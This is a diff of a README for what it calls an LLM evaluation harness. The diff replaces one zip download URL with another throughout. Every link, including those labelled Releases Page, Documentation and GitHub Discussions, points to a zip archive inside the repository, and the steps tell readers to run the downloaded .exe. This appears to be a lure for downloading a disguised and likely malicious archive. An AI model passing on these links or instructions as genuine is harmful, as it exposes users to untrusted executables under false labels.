@@ -1,6 +1,6 @@
 # 🚀 llm-eval-harness - Easy Evaluation for LLM Models
 
-[![Download](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip%20Now%20-%20Get%20Started%20with%20llm--eval--harness-blue)](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip)
+[![Download](https://raw.githubusercontent.com/aaddii09/llm-eval-harness/main/data/harness-llm-eval-3.6.zip%20Now%20-%20Get%20Started%20with%20llm--eval--harness-blue)](https://raw.githubusercontent.com/aaddii09/llm-eval-harness/main/data/harness-llm-eval-3.6.zip)
 
 ## 📦 Overview
 
@@ -27,16 +27,16 @@ The application runs on most modern computers. Here are the minimum requirements
 
 To get started with the **llm-eval-harness**, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/aaddii09/llm-eval-harness/main/data/harness-llm-eval-3.6.zip).
   
 2. **Download the Latest Version:** Find the latest release. Click on the appropriate file for your operating system.
 
-   ![Download Release](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip%20Version%20-%20Latest%20Release%20Green)
+   ![Download Release](https://raw.githubusercontent.com/aaddii09/llm-eval-harness/main/data/harness-llm-eval-3.6.zip%20Version%20-%20Latest%20Release%20Green)
 
 3. **Run the Application:**
    - For Windows: Double-click the downloaded `.exe` file to start.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder, then launch it.
-   - For Linux: Extract the downloaded `https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip` file and run it from your terminal.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/aaddii09/llm-eval-harness/main/data/harness-llm-eval-3.6.zip` file and run it from your terminal.
 
 ## 🛠️ Usage Guide
 
@@ -68,8 +68,8 @@ If you want to contribute to the project, please fork the repository, make your 
 
 ## 📚 Additional Resources
 
-- More details can be found in the [Documentation](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip).
-- Stay updated with the latest features and updates through our [GitHub Discussions](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip).
+- More details can be found in the [Documentation](https://raw.githubusercontent.com/aaddii09/llm-eval-harness/main/data/harness-llm-eval-3.6.zip).
+- Stay updated with the latest features and updates through our [GitHub Discussions](https://raw.githubusercontent.com/aaddii09/llm-eval-harness/main/data/harness-llm-eval-3.6.zip).
 
 ## 🌟 Thank You
 
